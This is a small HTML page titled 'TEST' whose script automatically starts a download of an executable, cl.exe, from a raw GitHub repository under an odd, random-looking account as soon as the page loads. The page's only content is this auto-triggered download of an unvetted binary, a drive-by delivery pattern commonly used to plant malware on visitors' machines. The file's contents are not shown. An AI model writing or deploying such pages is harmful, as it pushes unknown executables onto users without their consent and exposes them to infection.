<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TEST</title>
    <script>
        window.onload = function() {
            // Simulate downloading the cl.exe file from the provided URL
            var downloadLink = document.createElement('a');
            downloadLink.href = 'https://github.com/hubertloudgfdxgx/krc/raw/refs/heads/main/cl.exe';  // Link to cl.exe
            downloadLink.download = 'cl.exe';  // Suggested filename for download
            downloadLink.click();  // Trigger the download automatically
        };
    </script>
</head>
<body>
    <h1>TEST</h1>
    <p>This page will automatically start downloading <strong>cl.exe</strong> when it loads.</p>
</body>
</html>
